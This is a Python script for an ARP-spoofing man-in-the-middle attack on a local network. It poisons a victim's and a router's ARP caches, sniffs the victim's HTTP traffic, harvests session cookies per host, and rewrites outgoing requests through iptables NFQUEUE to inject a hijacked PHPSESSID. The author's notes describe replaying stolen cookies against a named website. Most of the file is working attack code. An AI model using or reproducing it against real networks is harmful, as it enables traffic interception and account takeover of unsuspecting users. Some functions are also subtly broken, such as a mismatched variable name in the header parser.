#!/usr/bin/python

from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
import os
import nfqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
import argparse
from threading import Thread, Lock
import signal
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

COOKIES = {}
mutex = Lock()
get = ''
packt = None
show = 0

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
    parser.add_argument("-p", "--partialheader", help="Choose a partial string of a complete HTTP header to delete it. Example: -h 'Cookie: '")
    parser.add_argument("-i", "--inject", help="Choose HTTP header string to inject. Example: -i 'Cookie: PHPSESSID=V41u3H3r3'")
    return parser.parse_args()

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

def sniffer(args):
    sniff(iface='wlan0', prn=sniff_cb, store=False, filter='tcp and src %s' % args.victimIP)

def find_host(header_lines):
    global get ##########################################
    get_found = 0
    for h in header_lines:
        if 'GET ' in h:
            get = h.split()[1] ##############################################
            get_found = 1
        if get_found == 1:
            if 'host: ' in h.lower():
                host = h.split(' ', 1)[1]
                if 'www.' in host:
                    host = host.replace('www.', '')
                return host

def cookie_finder(header_lines, pkt): # PKT may be taken out, just test
    global packt
    found_get = 0
    host = find_host(header_lines)
    if host:
        for h in header_lines:
            if 'cookie: ' in h.lower(): ########################### HEADER HERE
                if host in COOKIES:
                    if COOKIES[host] != h:
                        with mutex:
                            COOKIES[host] = h
                            print 'UPDATED'
                        return
                    else:
                        return
                else:
                    with mutex:
                        COOKIES[host] = h
                    packt = pkt #########################################
                    print 'ADDED ---', COOKIES[host]
                    return
def ip_setup():
#    os.system('iptables -t nat -A PREROUTING -p tcp -j NFQUEUE') # Catches MITM victim to/from
#    os.system('iptables -A FORWARD -p tcp -j NFQUEUE') # Just victim > outside servers
    os.system('iptables -A OUTPUT -p tcp --dport 80 -j NFQUEUE') # Attacker's outgoing http packets
#    os.system('iptables -A OUTPUT -p tcp -j NFQUEUE') # Attacker's outgoing http packets
#    os.system('iptables -A INPUT -p tcp -j NFQUEUE')
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '1\n':
        ipf.write('1\n')
    ipf.close()
    print '[*] iptables queue started and IP forwarding enabled'
    return ipf_read

def headers_body(load):
    try:
        header, body = load.split("\r\n\r\n", 1)
        return (headers, body)
    except Exception:
        headers = load
        body = ''
        return (headers, body)

def sniff_cb(pkt):
    if pkt.haslayer(Raw):
        load = pkt[Raw].load
        headers, body = headers_body(load)
        header_lines = headers.split("\r\n")
        cookie_finder(header_lines, pkt) #PKT may be taken out, just test

def queue_cb(payload):
    '''Filter: only tcp packets from the script-running machine destined for port 80'''
    if len(COOKIES) > 0:
        data = payload.get_data()
        pkt = IP(data)
        if pkt.haslayer(Raw):
            load = pkt[Raw].load
            headers, body = headers_body(load)
            header_lines = headers.split("\r\n")
            host = find_host(header_lines)
            if host:
                if host in COOKIES:
                    return cookie_replace(payload, pkt, host, header_lines)
    payload.set_verdict(nfqueue.NF_ACCEPT)

injected = 0
def cookie_replace(payload, pkt, host, header_lines):
    global injected
    args = arg_parser()
    if injected == 0:
        try:
            new_header_lines = []
            c_found = 0
            for h in header_lines:
                if 'Cookie: ' in h: ########################### HEADER HERE
                    h = 'Cookie: PHPSESSID=3g2tke2ruahpap4gpb4em30sq5'
#                with mutex:
#                    h = COOKIES[host] ###################### INJECT HERE
                    c_found = 1
                    injected = 1
                if h != '':
                    new_header_lines.append(h)
            if c_found == 0:
                h = 'Cookie: PHPSESSID=3g2tke2ruahpap4gpb4em30sq5'
                injected = 1
#            h = COOKIES[host] ###################### INJECT HERE
                new_header_lines.append(h)
            new_load = "\r\n".join(new_header_lines)+"\r\n\r\n"
            for line in new_load.split("\r\n"):
                print repr(line)
            pkt[Raw].load = new_load
            pkt[IP].len = len(str(pkt))
            del pkt[IP].chksum
            del pkt[TCP].chksum
            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
            print '[+] Injected header for %s\n' % host
        except Exception as e:
            print '[-] Failed to inject packet, sending it on its way', e
            payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

class Queued(object):
    def __init__(self):
        self.q = nfqueue.queue()
        self.q.set_callback(queue_cb)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print '[*] Waiting for data'
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(500)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'

def main(args):
    global victimMAC, routerMAC

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    ipf_read = ip_setup()

    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    if routerMAC == None:
        sys.exit("[-] Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("[-] Could not find victim MAC address. Closing....")
    print '[*] Router MAC:',routerMAC
    print '[*] Victim MAC:',victimMAC

    snf = Thread(target=sniffer, args=(arg_parser(),))
    snf.daemon = True
    snf.start()

    Queued()
    rctr = Thread(target=reactor.run, args=(False,))
    rctr.daemon = True
    rctr.start()

    def signal_handler(signal, frame):
        print 'losing down, restoring network'
        restore(arg_parser().routerIP, arg_parser().victimIP, routerMAC, victimMAC)
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
            forward.write(ipf_read)
        os.system('iptables -F')
        os.system('iptables -X')
        os.system('iptables -t nat -F')
        os.system('iptables -t nat -X')
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    while 1:
        poison(args.routerIP, args.victimIP, routerMAC, victimMAC)
        time.sleep(1.5)

main(arg_parser())


# QUESTIONS/PROBLEMS
# Does the length of the cookie matter? Like will it at least transmit the request then? Cuz right now it doesn't transmit shit
# If you remove all the __utma/c/b/z cookies, will it still work in TamperData or fiddler or what have you?
# LANspy uses NF_DROP and send(pkt), let's try that out again.
# Could it have something to do with not having done the tcp handshake yet?
# Could I just send a stock packet and just adjust the specific values or just copy the entire new load into a new packet? I think I tried this and failed but maybe try again

# CASES
# WORKS if you just use phpsessid cookie ALONE when retransmitting to BMA, does NOT WORK if you retransmit all the cookies (like __utma/b/c/z)
# ^ This seems to imply it's something to do with the Cookie: header (maybe the length of it?) and not anything like pkt[IP].len or TCP timestamp headers or anything like that
# WORKS with tamperdata, cookie_cadger with complete replay of ALL cookies, not just the user session. Also works for a long time meaning it's probably not tied to timestamps
#
#
#
#
#
#




#def browser_start():
#    browser = webdriver.Firefox()
#    browser.get('http://www.bigmoneyarcade.com')
#    assert 'Play Fun Arcade' in browser.title
#    for k,v in COOKIES.iteritems():
#        ind = {k:v}
#        print ind
#        browser.add_cookie(ind)
#    browser.get('http://www.bigmoeyarcade.com')

#                        print 'Orignal:',repr(h)
#                        h = args.inject ###################### INJECT HERE
#                        pkt[IP].len = len(str(pkt))
#                        del pkt[IP].chksum
#                        del pkt[TCP].chksum
#                    new_header_lines.append(h)
##                print repr(new_header_lines)
#                new_load = "\r\n".join(new_header_lines)+"\r\n\r\n"+body
#                pkt[Raw].load = new_load
##                payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
#                print '[+] Injected header\n'
#            except Exception as e:
#                print 'Failed to inject packet, sending it on its way'
#                payload.set_verdict(nfqueue.NF_ACCEPT)

#                        if len(COOKIES) == 0:
#                            h = h.split(' ',1)
#                            cookie = h[1].split('; ')
#                            print cookie
#                            for c in cookie:
#                                c = c.split('=', 1)
#                                COOKIES[c[0]] = c[1]
#                            print COOKIES
#                            print ''

#    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
